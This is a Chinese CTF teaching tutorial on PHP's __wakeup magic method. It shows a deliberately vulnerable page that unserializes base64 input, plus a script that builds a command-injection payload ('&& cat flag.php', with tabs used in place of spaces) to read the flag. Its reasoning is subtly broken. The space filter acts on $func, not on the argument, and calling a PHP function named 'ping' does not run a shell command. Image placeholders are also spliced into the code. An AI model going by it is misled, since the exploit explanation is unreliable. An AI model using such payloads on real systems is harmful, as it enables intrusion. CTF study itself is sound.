# CTF-Web历年考题精讲教程：P4：反序列化与__wakeup魔术方法 🧩

![](img/ea3534616268f3d9d55059a31988b627_1.png)

在本节课中，我们将要学习PHP反序列化中的一个核心魔术方法：`__wakeup`。我们将通过一个具体的CTF题目，深入理解它的触发时机、执行流程以及如何利用它来构造攻击链。

---

![](img/ea3534616268f3d9d55059a31988b627_3.png)

![](img/ea3534616268f3d9d55059a31988b627_5.png)

## 概述

![](img/ea3534616268f3d9d55059a31988b627_7.png)

![](img/ea3534616268f3d9d55059a31988b627_9.png)

反序列化漏洞是Web安全中常见的考点。`__wakeup`是PHP中一个特殊的魔术方法，它会在对象被**反序列化时自动调用**。理解它的工作原理对于解决相关题目至关重要。

![](img/ea3534616268f3d9d55059a31988b627_11.png)

上一节我们介绍了反序列化的基本概念，本节中我们来看看`__wakeup`方法的具体应用和一道相关题目的解法。

![](img/ea3534616268f3d9d55059a31988b627_13.png)

![](img/ea3534616268f3d9d55059a31988b627_15.png)

![](img/ea3534616268f3d9d55059a31988b627_17.png)

---

![](img/ea3534616268f3d9d55059a31988b627_19.png)

![](img/ea3534616268f3d9d55059a31988b627_21.png)

## `__wakeup` 方法基础

![](img/ea3534616268f3d9d55059a31988b627_23.png)

![](img/ea3534616268f3d9d55059a31988b627_25.png)

![](img/ea3534616268f3d9d55059a31988b627_27.png)

`__wakeup()` 方法在对象进行反序列化（`unserialize()`）时被自动调用。它的常见用途是重新建立数据库连接、初始化操作或执行一些对象苏醒后必须的准备工作。

![](img/ea3534616268f3d9d55059a31988b627_29.png)

![](img/ea3534616268f3d9d55059a31988b627_31.png)

![](img/ea3534616268f3d9d55059a31988b627_33.png)

**基本语法结构如下：**
```php
public function __wakeup() {
    // 反序列化后自动执行的代码
}
```

![](img/ea3534616268f3d9d55059a31988b627_35.png)

---

## 示例代码分析

我们首先通过一个简单的例子，直观地感受`__wakeup`的执行流程。

![](img/ea3534616268f3d9d55059a31988b627_37.png)

![](img/ea3534616268f3d9d55059a31988b627_39.png)

```php
<?php
class Demo {
    private $a;
    private $b;

    public function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
        echo "构造函数被调用，参数：$a, $b\n";
    }

    public function __wakeup() {
        echo "__wakeup 方法被调用\n";
        $this->F1();
    }

    public function F1() {
        echo "F1 方法被调用\n";
    }

    public function __destruct() {
        echo "析构函数被调用\n";
    }
}

// 序列化过程
$obj = new Demo('123', 'get');
$serialized = serialize($obj);
echo "序列化后的字符串：\n" . $serialized . "\n\n";

![](img/ea3534616268f3d9d55059a31988b627_41.png)

![](img/ea3534616268f3d9d55059a31988b627_43.png)

// 反序列化过程
echo "开始反序列化：\n";
unserialize($serialized);
?>
```

**执行流程说明：**
1.  实例化`Demo`类时，`__construct`构造函数被调用。
2.  序列化对象生成字符串。
3.  反序列化该字符串时，**首先调用`__wakeup`方法**。
4.  `__wakeup`方法中调用了`F1`方法。
5.  最后，脚本结束时调用`__destruct`析构函数。

![](img/ea3534616268f3d9d55059a31988b627_45.png)

这个例子清晰地展示了`__wakeup`在反序列化链条中的优先执行顺序。

![](img/ea3534616268f3d9d55059a31988b627_47.png)

---

![](img/ea3534616268f3d9d55059a31988b627_49.png)

## CTF 题目实战：绕过过滤读取文件

![](img/ea3534616268f3d9d55059a31988b627_51.png)

![](img/ea3534616268f3d9d55059a31988b627_53.png)

现在，我们分析一道整合了`__wakeup`方法的CTF题目。目标是读取服务器上的`flag.php`文件内容。

![](img/ea3534616268f3d9d55059a31988b627_55.png)

![](img/ea3534616268f3d9d55059a31988b627_57.png)

![](img/ea3534616268f3d9d55059a31988b627_59.png)

### 题目代码分析

![](img/ea3534616268f3d9d55059a31988b627_61.png)

![](img/ea3534616268f3d9d55059a31988b627_63.png)

![](img/ea3534616268f3d9d55059a31988b627_65.png)

以下是题目核心代码逻辑：

```php
<?php
highlight_file(__FILE__);
class Demo {
    public function __construct($func, $arg) {
        $this->func = $func;
        $this->arg = $arg;
    }
    public function __wakeup() {
        // 过滤空格
        $this->func = str_replace(' ', '', $this->func);
    }
    public function __destruct() {
        // 动态调用函数
        if (in_array($this->func, array("ping"))) {
            call_user_func_array($this->func, $this->arg);
        }
    }
}

![](img/ea3534616268f3d9d55059a31988b627_67.png)

![](img/ea3534616268f3d9d55059a31988b627_69.png)

![](img/ea3534616268f3d9d55059a31988b627_71.png)

$input = $_GET['a'];
if (isset($input) && !empty($input)) {
    $serialized = base64_decode($input);
    unserialize($serialized);
}
?>
```

![](img/ea3534616268f3d9d55059a31988b627_72.png)

![](img/ea3534616268f3d9d55059a31988b627_74.png)

![](img/ea3534616268f3d9d55059a31988b627_76.png)

**代码逻辑梳理：**
1.  通过GET参数`a`接收一个Base64编码的字符串。
2.  解码后进行反序列化。
3.  反序列化时触发`__wakeup`，将对象属性`$func`中的**空格替换为空**。
4.  对象销毁时触发`__destruct`，检查`$func`是否为`"ping"`。如果是，则使用`call_user_func_array`以`$arg`为参数调用`ping`函数。

![](img/ea3534616268f3d9d55059a31988b627_78.png)

![](img/ea3534616268f3d9d55059a31988b627_80.png)

![](img/ea3534616268f3d9d55059a31988b627_82.png)

**解题思路：**
我们的目标是让服务器执行系统命令来读取`flag.php`。`ping`命令可以连接执行其他命令。思路是：
*   构造一个`Demo`对象，其`$func`为`"ping"`。
*   `$arg`为一个数组，包含我们想执行的命令，例如 `ping 127.0.0.1 && cat flag.php`。
*   由于`__wakeup`会过滤空格，我们需要将命令中的空格用其他空白字符（如制表符`\t`）代替。
*   最后序列化对象，并做Base64编码，传给参数`a`。

![](img/ea3534616268f3d9d55059a31988b627_84.png)

![](img/ea3534616268f3d9d55059a31988b627_85.png)

![](img/ea3534616268f3d9d55059a31988b627_87.png)

---

![](img/ea3534616268f3d9d55059a31988b627_89.png)

![](img/ea3534616268f3d9d55059a31988b627_91.png)

### 构造攻击载荷

![](img/ea3534616268f3d9d55059a31988b627_93.png)

![](img/ea3534616268f3d9d55059a31988b627_95.png)

![](img/ea3534616268f3d9d55059a31988b627_97.png)

以下是构造恶意序列化数据的步骤：

![](img/ea3534616268f3d9d55059a31988b627_99.png)

![](img/ea3534616268f3d9d55059a31988b627_101.png)

1.  **编写序列化生成脚本：**
    ```php
    <?php
    class Demo {
        public $func;
        public $arg;
    }
    // 使用制表符 \t 代替命令中的空格
    $obj = new Demo();
    $obj->func = 'ping';
    $obj->arg = array('127.0.0.1' . "\t" . '&&' . "\t" . 'cat' . "\t" . 'flag.php');
    echo base64_encode(serialize($obj));
    ?>
    ```
    运行此脚本，得到Base64编码后的攻击载荷。

![](img/ea3534616268f3d9d55059a31988b627_103.png)

![](img/ea3534616268f3d9d55059a31988b627_105.png)

![](img/ea3534616268f3d9d55059a31988b627_107.png)

![](img/ea3534616268f3d9d55059a31988b627_109.png)

![](img/ea3534616268f3d9d55059a31988b627_111.png)

2.  **发起攻击：**
    将生成的字符串作为`a`参数的值发送给题目页面。
    ```
    http://靶机地址/index.php?a=生成的Base64字符串
    ```

![](img/ea3534616268f3d9d55059a31988b627_112.png)

![](img/ea3534616268f3d9d55059a31988b627_114.png)

3.  **原理：**
    *   反序列化后，`__wakeup`尝试过滤`$func`（`ping`）中的空格，但其中无空格，故无影响。
    *   进入`__destruct`，`$func`值为`ping`，符合条件。
    *   `call_user_func_array('ping', $arg)`被执行。系统会尝试执行 `ping 127.0.0.1 && cat flag.php`。
    *   由于参数中的空格是制表符，未被过滤，命令得以正确拼接并执行，从而输出`flag.php`的内容。

![](img/ea3534616268f3d9d55059a31988b627_116.png)

![](img/ea3534616268f3d9d55059a31988b627_118.png)

![](img/ea3534616268f3d9d55059a31988b627_120.png)

---

![](img/ea3534616268f3d9d55059a31988b627_122.png)

## 总结

本节课我们一起学习了PHP反序列化中`__wakeup`魔术方法的核心知识。

![](img/ea3534616268f3d9d55059a31988b627_124.png)

![](img/ea3534616268f3d9d55059a31988b627_126.png)

![](img/ea3534616268f3d9d55059a31988b627_128.png)

*   **`__wakeup`的作用**：在对象被反序列化时自动调用，常用于初始化或数据过滤。
*   **在CTF中的考点**：常与`__destruct`等其他魔术方法组合，形成反序列化攻击链。题目会利用`__wakeup`进行一些过滤（如去空格），我们需要想办法绕过这些过滤（如使用制表符）。
*   **解题关键**：仔细审计代码，理解整个反序列化过程中对象的生命周期和属性变化，从而构造出能够执行目标命令的序列化字符串。

![](img/ea3534616268f3d9d55059a31988b627_130.png)

![](img/ea3534616268f3d9d55059a31988b627_131.png)

![](img/ea3534616268f3d9d55059a31988b627_133.png)

![](img/ea3534616268f3d9d55059a31988b627_135.png)

通过这道题，我们不仅掌握了`__wakeup`，也加深了对反序列化漏洞利用流程的理解。下节课我们将继续探讨反序列化中的其他魔术方法和相关技巧。